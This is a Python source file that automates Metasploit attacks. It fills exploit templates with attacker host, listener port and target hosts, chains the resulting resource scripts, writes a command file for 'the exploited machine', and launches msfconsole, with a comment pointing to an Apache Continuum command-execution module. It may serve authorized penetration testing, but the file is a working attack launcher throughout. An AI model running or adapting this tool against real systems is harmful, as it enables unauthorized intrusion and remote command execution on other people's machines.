from lib.tcp import generate_open_port
import os
import subprocess


def generate_payloads_chain_by_templates(templates):
    entries_length = len(templates)
    payloads_chain_dict = {}
    for i, template in enumerate(templates):
        if i < entries_length-1:
            payloads_chain_dict[template] = f'resource {get_payload_file_name_by_template(templates[i + 1])}'
        else:
            payloads_chain_dict[template] = ''

    return payloads_chain_dict


def get_payload_file_name_by_template(template):
    return f'{template.split(".template")[0]}.rc'


def generate_payloads(args):
    templates = os.listdir('./templates')
    payloads_chain_dict = generate_payloads_chain_by_templates(templates)

    multi_command_file_path = './payloads/m.rc'
    if not os.path.isfile(multi_command_file_path):
        multi_command_handler = open(multi_command_file_path, 'w')
        multi_command_handler.write('getuid\n')  # commands to run on the exploited machine
        multi_command_handler.close()

    for i, template in enumerate(templates):
        template_handler = open(f'./templates/{template}', 'r')
        template_contents = template_handler.read()
        payload_file_name = get_payload_file_name_by_template(template)
        payload_handler = open(f'./payloads/{payload_file_name}', 'w')
        payload_contents = template_contents.replace('__LHOST__', args['LHOST']) \
            .replace('__LPORT__', str(generate_open_port(args['LHOST']))) \
            .replace('__RHOSTS__', args['RHOSTS']) \
            .replace('__NEXT_PAYLOAD_SRC__', payloads_chain_dict[template])
        payload_handler.write(payload_contents)
        payload_handler.close()

        # set a symbolic link
        if i == 0:
            src = f'./payloads/{payload_file_name}'
            dst = './payloads/start.rc'

            # This creates a symbolic link on python in payloads directory
            os.symlink(src, dst)


def run_payloads():
    # msfconsole -r apache_contiuum_cmd_exec.rc
    output = subprocess.Popen(["msfconsole", "-r", "payloads/start.rc"])
    output.wait()

    return output
